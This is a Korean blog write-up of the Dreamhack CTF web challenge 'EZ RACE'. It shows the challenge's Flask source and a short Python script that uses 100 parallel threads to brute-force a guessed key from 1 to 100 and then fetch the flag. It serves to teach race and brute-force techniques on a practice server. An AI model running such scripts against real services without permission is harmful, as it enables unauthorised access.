---
layout: post
title: "[DH]EZ RACE"
date: 2025-08-07 19:41 +0900
category: Write-Up
tag: [dreamhack, web]
---
### **INFO**
![chall]
_Fig 1. Challenge_

requests와 theared 모듈을 사용한 병렬처리가 주요 포인트이다.

### **RECON**

문제는 매우 간단하다. Flask로 구성된 웹 서버의 파일(app.py)이 주어진다.

/race 경로에 1에서 100사이의 user 값을 쿼리로 입력하고, 운이 좋게 맞으면 플래그를 획득할 수 있는 상태가 된다.
그 후, /flag 경로에서 플래그를 가져가면 된다.

```py
@app.route('/race')
def race():
    global getflag, key

    user_input_str = request.args.get('user')
    userinput = int(user_input_str)

    if userinput == key:
        getflag = 1
        return "WOW"
    else:
        time.sleep(3)
        key = random.randint(1, 100)    # 1~100 사이의 값
        return "NOPE"

@app.route('/flag')
def flag():
    global getflag   
    if getflag == 1:
        getflag = 0
        return f"FLAG IS {FLAG}"        # 플래그 획득
    else:
        return "NOPE!!"
```

### **SOLUTION**

requests 모듈을 사용하여, 경로 `/race?user={RANDOM_VALUE}`에 get 요청을 보내주면 WOW 혹은 NOPE 응답을 받을 수 있다.

이 때, WOW 응답을 받은 상태에서 경로 `/flag`에 get 요청을 보내면 플래그를 획득 할 수 있다.

소스 코드에 3초룰을 지키지 않아도, 제한이 따로 없어서 필자는 그냥 300초를 기다린다는 마음으로 처음 시도에는 병렬처리를 하지 않고 풀었다.
![chim]

그래도 write-up을 쓸 때는 출제자의 의도에 맞게 threading까지 써서, 3초안에 해결되게 만들었다. 하핳ㅎ

### **POC**

```py
import requests
import threading

url = 'http://host8.dreamhack.games:14889'

def check(rint):
    res = requests.get(url+f"/race?user={rint}")
    if (res.text == "WOW"):
        re = requests.get(url+"/flag")
        print(re.text)

threads = []
for i in range(1, 101):     # 1~100 사이의 값
    t = threading.Thread(target=check, args=(i,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```


[chall]: /assets/DreamHack/ezrace/challenge.png
[3rule]: /assets/DreamHack/ezrace/solution_3rule.png
[chim]: /assets/DreamHack/ezrace/solution_chim.png